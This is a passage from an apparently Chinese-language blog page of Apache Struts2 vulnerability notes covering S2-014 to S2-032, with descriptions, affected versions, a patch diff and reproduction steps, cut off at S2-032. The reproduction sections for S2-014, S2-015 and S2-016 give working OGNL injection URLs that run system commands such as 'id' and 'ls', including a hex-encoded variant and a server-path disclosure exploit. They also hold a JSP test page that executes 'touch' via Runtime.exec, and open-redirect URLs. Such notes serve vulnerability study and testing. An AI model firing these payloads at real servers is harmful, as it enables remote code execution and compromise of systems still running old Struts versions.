+<h2 id=漏洞描述-26>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-26>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-014>S2-014 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p><code>Struts</code>中<code>&lt;s:url></code>和<code>&lt;s:a></code>标签都包含<code>includeParams</code>属性，其值可设为<code>none</code>、<code>get</code>或<code>all</code>，含义如下：</p>
+<pre tabindex=0><code>none	：	链接不包含请求的任意参数值(默认)
+get		：	链接只包含GET请求中的参数和值
+all		：	链接包含GET和POST所有参数和值
+</code></pre><p>包含特殊请求参数的请求可用来向堆栈注入任意<code>OGNL</code>代码，被用于<code>URL</code>或<code>A标签</code>中的请求参数。当<code>includeParams=all</code>时，会将本次请求的<code>GET</code>和<code>POST</code>参数都放在<code>URL</code>的<code>GET</code>参数上造成任意命令执行漏洞。</p>
+<p><code>S2-014</code>是对<code>S2-013</code>修复的加强，修复了<code>S2-013</code>代码中忽略的<code>${ognl_exp}</code> <code>OGNL</code>表达式的方式。</p>
+<h2 id=影响版本-22>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-22>#</a></h2>
+<p><code>Struts 2.0.0 ~ 2.3.14.1</code></p>
+<h2 id=漏洞复现-22>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-22>#</a></h2>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=${(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
+</code></pre><p>或</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/link.action?a=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
+</code></pre><h1 id=struts2-s2-015-通配符匹配机制引入的漏洞或ognl表达式的双重评估导致的远程命令执行漏洞-cve-2013-2134-cve-2013-2135>Struts2 S2-015 通配符匹配机制引入的漏洞或OGNL表达式的双重评估导致的远程命令执行漏洞 CVE-2013-2134 CVE-2013-2135<a hidden class=anchor aria-hidden=true href=#struts2-s2-015-通配符匹配机制引入的漏洞或ognl表达式的双重评估导致的远程命令执行漏洞-cve-2013-2134-cve-2013-2135>#</a></h1>
+<h2 id=漏洞描述-27>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-27>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-015>S2-015 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p><code>Struts2</code>允许在通配符的基础上定义动作映射，例：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=color:#f92672>&lt;action</span> <span style=color:#a6e22e>name=</span><span style=color:#e6db74>&#34;*&#34;</span> <span style=color:#a6e22e>class=</span><span style=color:#e6db74>&#34;example.ExampleSupport&#34;</span><span style=color:#f92672>&gt;</span>
+    <span style=color:#f92672>&lt;result&gt;</span>/example/{1}.jsp<span style=color:#f92672>&lt;/result&gt;</span>
+<span style=color:#f92672>&lt;/action&gt;</span>
+</code></pre></div><p>如果一个请求不匹配任何已定义当作，则将被<code>*</code>匹配，请求的动作名将用于被加载基于动作名的<code>JSP</code>文件。</p>
+<h2 id=影响版本-23>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-23>#</a></h2>
+<p><code>Struts 2.0.0 ~ 2.3.14.2</code></p>
+<h2 id=漏洞复现-23>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-23>#</a></h2>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/example/%25%7B1%2B1%7D.action
+</code></pre><p><code>Message</code>为<code>/2.jsp</code>。</p>
+<pre tabindex=0><code>%24%7B%23context%5B%27xwork%2EMethodAccessor%2EdenyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23%5FmemberAccess%2EgetClass%28%29%2EgetDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m%2EsetAccessible%28true%29%2C%23m%2Eset%28%23%5FmemberAccess%2Ctrue%29%2C%23q%3D%40org%2Eapache%2Ecommons%2Eio%2EIOUtils%40toString%28%40java%2Elang%2ERuntime%40getRuntime%28%29%2Eexec%28%27id%27%29%2EgetInputStream%28%29%29%2C%23q%7D%2Eaction
+</code></pre><p>执行<code>id</code>命令，<code>Message</code>处为执行结果。</p>
+<h1 id=struts2-s2-016-通过操作前缀actionredirectredirectaction参数造成远程命令执行漏洞-cve-2013-2251>Struts2 S2-016 通过操作前缀<code>action:</code>、<code>redirect:</code>、<code>redirectAction:</code>参数造成远程命令执行漏洞 CVE-2013-2251<a hidden class=anchor aria-hidden=true href=#struts2-s2-016-通过操作前缀actionredirectredirectaction参数造成远程命令执行漏洞-cve-2013-2251>#</a></h1>
+<h2 id=漏洞描述-28>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-28>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-016>S2-016 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p><code>DefaultActionMapper</code>类支持以<code>action:</code>、<code>redirect:</code>、<code>redirectAction:</code>作为导航或重定向前缀，但这些后缀后面同时可以跟<code>OGNL</code>表达式，<code>Struts2</code>并未对这些前缀做过滤，导致利用<code>OGNL</code>表达式调用<code>Java</code>静态方法执行任意系统命令。</p>
+<p>简而言之就是：在对特殊<code>URL</code>处理中，<code>redirect</code>与<code>redirecrAction</code>后跟上<code>OGNL</code>表达式会被服务器执行。</p>
+<h2 id=影响版本-24>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-24>#</a></h2>
+<p><code>Struts 2.0.0 ~ 2.3.15</code></p>
+<h2 id=漏洞复现-24>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-24>#</a></h2>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D
+</code></pre><p>执行了<code>id</code>命令，结果回显在<code>URL</code>。</p>
+<pre tabindex=0><code>redirect:%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d
+</code></pre><p>执行<code>ls</code>命令，结果以文件返回。</p>
+<p>爆路径<code>EXP</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D
+</code></pre><h1 id=struts2-s2-017-通过操作前缀redirectredirectaction参数引入漏洞允许打开重定向-cve-2013-2248>Struts2 S2-017 通过操作前缀<code>redirect:</code>、<code>redirectAction:</code>参数引入漏洞允许打开重定向 CVE-2013-2248<a hidden class=anchor aria-hidden=true href=#struts2-s2-017-通过操作前缀redirectredirectaction参数引入漏洞允许打开重定向-cve-2013-2248>#</a></h1>
+<h2 id=漏洞描述-29>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-29>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-017>S2-017 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p><code>Struts2</code>的<code>DeaultActionMapper</code>曾支持一种短路导航状态改变的方法，即在参数前加<code>redirect:</code>、<code>redirectAction:</code>，再加上想要跳转的目标表达式。本来这种机制的目的是方便把导航信息附加到表单中的按钮上，但可以很容易的用来重定向到任意位置。</p>
+<h2 id=影响版本-25>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-25>#</a></h2>
+<p><code>Struts 2.0.0 ~ 2.3.15</code></p>
+<h2 id=漏洞复现-25>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-25>#</a></h2>
+<p><code>POC</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/showcase.action?redirect:http://oopsdc.tk/
+http://&lt;ip&gt;:&lt;oprt&gt;/fileupload/upload.action?redirect:http://oopsdc.tk/
+http://&lt;ip&gt;:&lt;oprt&gt;/modelDriven/modelDriven.action?redirectAction:http://oopsdc.tk/
+</code></pre><h1 id=struts2-s2-018-访问控制漏洞>Struts2 S2-018 访问控制漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-018-访问控制漏洞>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-018>S2-018 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-019-默认情况下禁用动态方法调用-cve-2016-0785>Struts2 S2-019 默认情况下禁用动态方法调用 CVE-2016-0785<a hidden class=anchor aria-hidden=true href=#struts2-s2-019-默认情况下禁用动态方法调用-cve-2016-0785>#</a></h1>
+<h2 id=漏洞描述-30>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-30>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-019>S2-019 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>S2-019漏洞利用条件极为严格：</p>
+<p>特殊代码、<code>value</code>值为空、可传参到<code>value</code>、可控制<code>name</code></p>
+<p>代码执行过程大致为如下：</p>
+<p>先尝试获取<code>value</code>的值，若为空，则二次解释执行了<code>name</code>，且在执行前给<code>name</code>加上了<code>%{}</code>，最终造成二次执行。</p>
+<h2 id=漏洞影响>漏洞影响<a hidden class=anchor aria-hidden=true href=#漏洞影响>#</a></h2>
+<p><code>Struts 2.0.0 ~ 2.3.24.1 (2.3.20.3除外)</code></p>
+<h2 id=漏洞复现-26>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-26>#</a></h2>
+<p>特殊代码如下：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>s:i18n</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;%&amp;#123#request.lan&amp;#125&#34;</span>&gt;xxxxx&lt;/<span style=color:#f92672>s:i18n</span>&gt;
+&lt;<span style=color:#f92672>set</span> <span style=color:#a6e22e>var</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;%&amp;#123#parameters.tang3&amp;#125&#34;</span>/&gt;
+</code></pre></div><p>通过<code>%&#123#&#125</code>的方式获取用户输入标签属性，导致代码执行。之后的修复方式为直接过滤<code>%&#123&#125</code>形式的字符串<code>OGNL</code>解析。</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=color:#75715e>//core/src/main/java/org/apache/struts2/components/Component.java
+</span><span style=color:#75715e></span><span style=color:#66d9ef>protected</span> Object <span style=color:#a6e22e>findValue</span><span style=color:#f92672>(</span>String expr<span style=color:#f92672>,</span> Class toType<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>altSyntax<span style=color:#f92672>()</span> <span style=color:#f92672>&amp;&amp;</span> toType <span style=color:#f92672>==</span> String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>altSyntax<span style=color:#f92672>()</span> <span style=color:#f92672>&amp;&amp;</span> toType <span style=color:#f92672>==</span> String<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+<span style=color:#f92672>-</span>            <span style=color:#66d9ef>return</span> TextParserUtil<span style=color:#f92672>.</span><span style=color:#a6e22e>translateVariables</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#39;%&#39;</span><span style=color:#f92672>,</span> expr<span style=color:#f92672>,</span> stack<span style=color:#f92672>);</span>
+<span style=color:#f92672>+</span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>ComponentUtils<span style=color:#f92672>.</span><span style=color:#a6e22e>containsExpression</span><span style=color:#f92672>(</span>expr<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
+<span style=color:#f92672>+</span>                <span style=color:#66d9ef>return</span> TextParserUtil<span style=color:#f92672>.</span><span style=color:#a6e22e>translateVariables</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#39;%&#39;</span><span style=color:#f92672>,</span> expr<span style=color:#f92672>,</span> stack<span style=color:#f92672>);</span>
+<span style=color:#f92672>+</span>            <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+<span style=color:#f92672>+</span>                <span style=color:#66d9ef>return</span> expr<span style=color:#f92672>;</span>
+<span style=color:#f92672>+</span>            <span style=color:#f92672>}</span>
+        <span style=color:#f92672>}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{}</span> <span style=color:#66d9ef>else</span> <span style=color:#f92672>{</span>
+            expr <span style=color:#f92672>=</span> stripExpressionIfAlySyntax<span style=color:#f92672>(</span>expr<span style=color:#f92672>);</span>
+            expr <span style=color:#f92672>=</span> stripExpressionIfAlySyntax<span style=color:#f92672>(</span>expr<span style=color:#f92672>);</span>
+
+
+<span style=color:#75715e>//core/src/main/java/org/apache/struts2/components/Component.java
+</span><span style=color:#75715e></span><span style=color:#f92672>+</span>      <span style=color:#f92672>*</span> <span style=color:#a6e22e>@param</span> expr to treat as an expression
+       <span style=color:#f92672>*</span> <span style=color:#a6e22e>@return</span> <span style=color:#66d9ef>true</span> <span style=color:#66d9ef>if</span> it is an expression
+       <span style=color:#f92672>*</span> <span style=color:#a6e22e>@return</span> <span style=color:#66d9ef>true</span> <span style=color:#66d9ef>if</span> it is an expression
+       <span style=color:#f92672>*/</span>          <span style=color:#f92672>*/</span>
+<span style=color:#f92672>-</span>       <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>isExpression</span><span style=color:#f92672>(</span>Object value<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+<span style=color:#f92672>+</span>           <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>isExpression</span><span style=color:#f92672>(</span>String expr<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+<span style=color:#f92672>-</span>               String expr <span style=color:#f92672>=</span> value<span style=color:#f92672>.</span><span style=color:#a6e22e>toString</span><span style=color:#f92672>();</span>
+               <span style=color:#66d9ef>return</span> expr<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;%{&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> expr<span style=color:#f92672>.</span><span style=color:#a6e22e>endsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;}&#34;</span><span style=color:#f92672>);</span>
+               <span style=color:#66d9ef>return</span> expr<span style=color:#f92672>.</span><span style=color:#a6e22e>startsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;%{&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> expr<span style=color:#f92672>.</span><span style=color:#a6e22e>endsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;}&#34;</span><span style=color:#f92672>);</span>
+           <span style=color:#f92672>}</span>
+       <span style=color:#f92672>}</span>
+
+<span style=color:#f92672>+</span>       <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>containsExpression</span><span style=color:#f92672>(</span>String expr<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
+<span style=color:#f92672>+</span>           <span style=color:#66d9ef>return</span> expr<span style=color:#f92672>.</span><span style=color:#a6e22e>contains</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;%{&#34;</span><span style=color:#f92672>)</span> <span style=color:#f92672>&amp;&amp;</span> expr<span style=color:#f92672>.</span><span style=color:#a6e22e>endsWith</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;}&#34;</span><span style=color:#f92672>);</span>
+<span style=color:#f92672>+</span>       <span style=color:#f92672>}</span>
+</code></pre></div><p>以上述代码为例，修改后的代码处理掉了非<code>%&#123</code>开头，<code>&#125</code>结尾的字符串进行<code>OGNL</code>解析的功能，举个例子：</p>
+<p><code>bar%&#1232+3&#125</code>，在修改之前的代码中<code>2+3</code>会被作为<code>OGNL</code>执行。而修改之后，这种形式就只会被当做字符串来返回。</p>
+<p>审计方法就是查看是否存在以<code>%&#123#&#125</code>方式获取用户输入变量赋值给标签属性的代码写法。</p>
+<p>测试代码：</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span><span style=color:#a6e22e>page</span> <span style=color:#66d9ef>import</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;java.util.HashSet&#34;</span><span style=color:#f92672>%&gt;</span>
+<span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span><span style=color:#a6e22e>page</span> <span style=color:#a6e22e>contentType</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/html;charset=UTF-8&#34;</span> <span style=color:#a6e22e>language</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;java&#34;</span><span style=color:#f92672>%&gt;</span>
+<span style=color:#f92672>&lt;%</span><span style=color:#960050;background-color:#1e0010>@</span><span style=color:#a6e22e>taglib</span> <span style=color:#a6e22e>prefix</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;s&#34;</span> <span style=color:#a6e22e>uri</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/struts-tags&#34;</span><span style=color:#f92672>%&gt;</span>
+<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>html</span><span style=color:#f92672>&gt;</span>
+    <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>head</span><span style=color:#f92672>&gt;</span>
+        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>title</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>Test</span> <span style=color:#a6e22e>JSP</span> <span style=color:#a6e22e>Page</span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/title&gt;</span>
+    <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/head&gt;</span>
+    <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>body</span><span style=color:#f92672>&gt;</span>
+        <span style=color:#f92672>&lt;%</span><span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>setAttribute</span>(<span style=color:#e6db74>&#34;a&#34;</span>, <span style=color:#e6db74>&#34;&#39;),#_memberAccess[&#39;allowPrivateAccess&#39;]=true,#_memberAccess[&#39;allowProtectedAccess&#39;]=true,#_memberAccess[&#39;allowPackageProtectedAccess&#39;]=true,#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true,#_memberAccess[&#39;excludedPackageNamePatterns&#39;]=#_memberAccess[&#39;acceptProperties&#39;],#_memberAccess[&#39;excludedClasses&#39;]=#_memberAccess[&#39;acceptProperties&#39;],#a=@java.lang.Runtime@getRuntime(),#a.exec(&#39;touch /tmp/th1s_1s_test&#39;),new java.lang.String(&#39;&#34;</span>);<span style=color:#f92672>%&gt;</span>
+        <span style=color:#f92672>&lt;</span><span style=color:#a6e22e>s</span><span style=color:#f92672>:</span><span style=color:#a6e22e>i18n</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;%&amp;#123#request.lan&amp;#125&#34;</span><span style=color:#f92672>&gt;</span><span style=color:#a6e22e>xxxxx</span><span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/s:i18n&gt;</span>
+    <span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/body&gt;</span>
+<span style=color:#f92672>&lt;</span><span style=color:#960050;background-color:#1e0010>/html&gt;</span>
+</code></pre></div><p><code>URL</code>：</p>
+<pre tabindex=0><code>http://&lt;ip&gt;:&lt;port&gt;/index.jsp?a=1
+</code></pre><p>生成<code>tmp/th1s_1s_test</code>。</p>
+<h1 id=struts2-s2-020-将commons-fileupload升级到版本131避免dos攻击并添加class以排除parametersinterceptor中的params避免classloader操作>Struts2 S2-020 将Commons FileUpload升级到版本1.3.1(避免DoS攻击)并添加&rsquo;class&rsquo;以排除ParametersInterceptor中的params(避免ClassLoader操作)<a hidden class=anchor aria-hidden=true href=#struts2-s2-020-将commons-fileupload升级到版本131避免dos攻击并添加class以排除parametersinterceptor中的params避免classloader操作>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-020>S2-020 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-021-改进parametersinterceptor和cookieinterceptor中被排除的参数以避免classloader操作>Struts2 S2-021 改进ParametersInterceptor和CookieInterceptor中被排除的参数，以避免ClassLoader操作<a hidden class=anchor aria-hidden=true href=#struts2-s2-021-改进parametersinterceptor和cookieinterceptor中被排除的参数以避免classloader操作>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-021>S2-021 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-022-在cookieinterceptor中扩展排除的params以避免操纵struts的内部>Struts2 S2-022 在CookieInterceptor中扩展排除的params以避免操纵Struts的内部<a hidden class=anchor aria-hidden=true href=#struts2-s2-022-在cookieinterceptor中扩展排除的params以避免操纵struts的内部>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-022>S2-022 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-023-可预测令牌生成值>Struts2 S2-023 可预测令牌生成值<a hidden class=anchor aria-hidden=true href=#struts2-s2-023-可预测令牌生成值>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-023>S2-023 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-024-错误的excludeparams覆盖defaultexcludedpatternschecker中的定义值>Struts2 S2-024 错误的excludeParams覆盖DefaultExcludedPatternsChecker中的定义值<a hidden class=anchor aria-hidden=true href=#struts2-s2-024-错误的excludeparams覆盖defaultexcludedpatternschecker中的定义值>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-024>S2-024 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-025-调试模式和公开的jsp文件中的跨站点脚本漏洞>Struts2 S2-025 调试模式和公开的JSP文件中的跨站点脚本漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-025-调试模式和公开的jsp文件中的跨站点脚本漏洞>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-025>S2-025 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-026-特殊的可用于访问struts内部的顶级对象>Struts2 S2-026 特殊的可用于访问Struts内部的顶级对象<a hidden class=anchor aria-hidden=true href=#struts2-s2-026-特殊的可用于访问struts内部的顶级对象>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-026>S2-026 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-027-textparseutiltranslatevariables未过滤恶意ognl表达式>Struts2 S2-027 TextParseUtil.translateVariables未过滤恶意OGNL表达式<a hidden class=anchor aria-hidden=true href=#struts2-s2-027-textparseutiltranslatevariables未过滤恶意ognl表达式>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-027>S2-027 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-028-使用具有损坏的urldecoder实现的jre可能会导致基于struts-2的web应用程序中的xss漏洞>Struts2 S2-028 使用具有损坏的URLDecoder实现的JRE可能会导致基于Struts 2的Web应用程序中的XSS漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-028-使用具有损坏的urldecoder实现的jre可能会导致基于struts-2的web应用程序中的xss漏洞>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-028>S2-028 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-029-在标记属性中对原始用户输入进行评估时强制双ognl评估可能导致远程代码执行>Struts2 S2-029 在标记属性中对原始用户输入进行评估时，强制双OGNL评估可能导致远程代码执行<a hidden class=anchor aria-hidden=true href=#struts2-s2-029-在标记属性中对原始用户输入进行评估时强制双ognl评估可能导致远程代码执行>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-029>S2-029 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-030-i18ninterceptor中可能的xss漏洞>Struts2 S2-030 I18NInterceptor中可能的XSS漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-030-i18ninterceptor中可能的xss漏洞>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-030>S2-030 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-031-xsltresult解析任意样式表漏洞>Struts2 S2-031 XSLTResult解析任意样式表漏洞<a hidden class=anchor aria-hidden=true href=#struts2-s2-031-xsltresult解析任意样式表漏洞>#</a></h1>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-031>S2-031 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<h1 id=struts2-s2-032-使用动态方法调试时可通过前缀执行远程代码-cve-2016-3081>Struts2 S2-032 使用动态方法调试时，可通过前缀执行远程代码 CVE-2016-3081<a hidden class=anchor aria-hidden=true href=#struts2-s2-032-使用动态方法调试时可通过前缀执行远程代码-cve-2016-3081>#</a></h1>
+<h2 id=漏洞描述-31>漏洞描述<a hidden class=anchor aria-hidden=true href=#漏洞描述-31>#</a></h2>
+<p><a href=https%EF%BC%9A//cwiki.apache.org/confluence/display/WW/S2-032>S2-032 - Apache Struts 2 Wiki - Apache Software Foundation</a></p>
+<p>可使用<code>mothod：Action</code>前缀调用声明为<code>publicd</code>的函数，但在低版本中不会对<code>name</code>方法值做<code>OGNL</code>计算。</p>
+<h2 id=影响版本-26>影响版本<a hidden class=anchor aria-hidden=true href=#影响版本-26>#</a></h2>
+<p><code>Struts 2.3.20 ~ 2.3.28 (2.3.20.3、2.3.24.3除外)</code></p>
+<h2 id=漏洞复现-27>漏洞复现<a hidden class=anchor aria-hidden=true href=#漏洞复现-27>#</a></h2>
+<p>环境搭建：</p>
